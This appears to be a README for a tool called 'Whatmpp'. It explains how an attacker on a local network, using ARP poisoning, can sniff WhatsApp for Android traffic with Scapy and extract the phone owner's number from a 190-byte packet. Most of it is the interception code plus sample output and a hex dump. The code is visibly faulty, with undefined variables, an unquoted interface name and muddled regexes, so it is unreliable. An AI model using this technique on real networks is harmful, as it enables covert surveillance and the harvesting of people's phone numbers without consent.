#Whatmpp
---
###NOTE:

The number regex will not work if the number(target) does not start with 9 

---
WhatsApp for Android devices broadcasts the owner's phone number in plain text over SSL.
This is a huge disadvantage and to some, a threat; especially with online caller id
services like truecaller(SEE::[Callerpy](http://callerpy.sysbase.org)).

The Packet in question has a fixed length of 190:

Example:
```
HEX
0000   44 87 FC E7 DD A7 20 02  AF 05 8D 0D 08 00 45 00   D..... .......E.
0010   00 B0 9A 4F 40 00 40 06  C4 27 C0 A8 01 E8 32 16   ...O@.@..'....2.
0020   E7 2A 86 92 01 BB 8B 05  37 96 96 B4 94 44 80 18   .*......7....D..
0030   00 E5 A0 04 00 00 01 01  08 0A 01 51 AE 52 BB EE   ...........Q.R..
0040   18 0D 57 41 01 02 00 00  17 F8 05 01 C8 AB A5 FC   ..WA............
0050   0F 41 6E 64 72 6F 69 64  2D 32 2E 31 31 2E 39 33   .Android-2.11.93
0060   00 00 12 FB 02 BB F8 03  F8 01 9C F8 03 E4 CB 0C   ................
0070   F8 03 B9 7C CA 00 00 46  F8 08 10 DA FC 0C 39 36   ...|...F......xx
0080   36 31 36 33 32 39 37 39  37 37 DA CF 6D EC FC 2E   xxxxxxxxxx..m...
0090   A3 C3 70 41 90 25 FE 4E  80 50 00 7D A1 03 79 C5   ..pA.%.N.P.}..y.
00a0   44 9E 4F A3 3C A7 50 E1  10 0F 96 FF 7F 36 51 49   D.O.<.P......6QI
00b0   17 EF 2E 4C C1 6B 2E 38  5B DA 33 7C DA AD         ...L.k.8[.3|..
```
```
RAW
'WA\x01\x02\x00\x00\x17\xf8\x05\x01\xc8\xab\xa5\xfc\x0fAndroid-2.11.93
\x00\x00\x12\xf8\x02\xbb\xf8\x03\xf8\x01\x9c\xf8\x03\xe4\xcb\x0c\xf8\x03
\xb9|\xca\x00\x00F\xf8\x08\x10\xda\xfc\x0cXXXXXXXXXX\xe8\xcfm\xec\xfc.
\xa3\xc3pA\x90%\xfeN\x80P\x00}\xa1\x03y\xc5D\x9eO\xa3<\xa7P\xe1\x10\x0f
\x96\xff\x7f6QI\x17\xef.L\xc1k.8[\xda3|\xda\xad
```
```
xxxxxxxxxx  ---> Phone Number in HEX
XXXXXXXXXX  ---> Phone Number in RAW
```

Scapy comes in handy when automating this process, as oppose to going through
the dump and finding it manually.

Scapy has a built-in function for 'sniffing' packets-sniff().
```
sniff(count=0, store=1, offline=None, prn=None, lfilter=None, L2socket=None, 
  timeout=None, opened_socket=None, stop_filter=None, *arg, **karg)
```
```
Sniff packets
sniff([count=0,] [prn=None,] [store=1,] [offline=None,]
      [lfilter=None,] + L2ListenSocket args) -> list of packets

  count: number of packets to capture. 0 means infinity

  store: wether to store sniffed packets or discard them

    prn: function to apply to each packet. If something is returned,
         it is displayed. Ex:
         ex: prn = lambda x: x.summary()

lfilter: python function applied to each packet to determine
         if further action may be done
         ex: lfilter = lambda x: x.haslayer(Padding)

offline: pcap file to read packets from, instead of sniffing them

timeout: stop sniffing after a given time (default: None)

L2socket: use the provided L2socket

opened_socket: provide an object ready to use .recv() on

stop_filter: python function applied to each packet to determine
             if we have to stop the capture after this packet
             ex: stop_filter = lambda x: x.haslayer(TCP)
```

Code

###This assumes ARP-Poisoning

```
root@J-Smith:~# scapy
Welcome to Scapy (2.2.0)
>>> s = sniff(iface=eth0, filter='tcp and host 192.168.1.43', count=1000)
>>> for r in range(1000):
...     try:
...          while len(s[r]) == 190:
...                summ = r
...                print '\nPacket::%s::Length::%s' %(str(summ),  str(length)) 
...                print 'Summary::%s' %str(load_pcap[r].summary())
...                inst = s[r].load
...                esc = re.split('[\W]+[^9]', inst)
...                reg = re.compile("[0-9]+[^9]")
...                number = reg.findall(str(esc))
...                for i in number:
...                      ii = i
...                reg2 = re.split("['-]", str(ii))
...                for iii in reg2:
...                      if len(iii) > 5:
...                         print 'Phone Number::%s' %str(iii)
...                break
...     except:
...       pass
... 
Packet::70::Length::190
Summary::Ether / IP / TCP 192.168.1.43:46937 > 50.22.231.39:https PA / Raw
Phone Number::1234567890

Packet::1602::Length::190
Summary::Ether / IP / TCP 192.168.1.43:34450 > 50.22.231.42:https PA / Raw
Phone Number::1234567890

Packet::2151::Length::190
Summary::Ether / IP / TCP 192.168.1.43:55404 > 184.173.136.74:https PA / Raw
Phone Number::1234567890
```
Explanation

```
sniff(iface=eth0, filter='tcp and host 192.168.1.43', count=1000)
####sniff 1000 TCP packets over eth0 coming from and going to 192.168.1.43####

for r in range(1000): #Enumerate 1000 times-number of packets
...     try:
...          while len(s[r]) == 190: #find packets of length 190
...                summ = r
...                print '\nPacket::%s::Length::%s' %(str(summ),  str(length)) 
...                print 'Summary::%s' %str(load_pcap[r].summary())
...                inst = s[r].load 

                   ####
                   s[70].load
'WA\x01\x02\x00\x00\x17\xf8\x05\x01\xc8\xab\xa5\xfc\x0fAndroid-2.11.93
\x00\x00\x12\xf8\x02\xbb\xf8\x03\xf8\x01\x9c\xf8\x03\xe4\xcb\x0c\xf8\x03
\xb9|\xca\x00\x00F\xf8\x08\x10\xda\xfc\x0cXXXXXXXXXX\xe8\xcfm\xec\xfc.
\xa3\xc3pA\x90%\xfeN\x80P\x00}\xa1\x03y\xc5D\x9eO\xa3<\xa7P\xe1\x10\x0f
\x96\xff\x7f6QI\x17\xef.L\xc1k.8[\xda3|\xda\xad

                   #This is how the load looks like.
                   #In order to get rid of the ASCII output, we will need to regex
                   ####
...                esc = re.split('[\W]+[^9]', inst) #split any non-alphanumeric character 
                                                     #and starting with number 9 in the load
...                reg = re.compile("[0-9]+[^9]")
...                number = reg.findall(str(esc))    #Find all numbers starting with 9
...                for i in number:
...                      ii = i
...                reg2 = re.split("['-]", str(ii))  #Remove space
...                for iii in reg2:
...                      if len(iii) > 5:
...                         print 'Phone Number::%s' %str(iii)
...                break
...     except:
...       pass
```

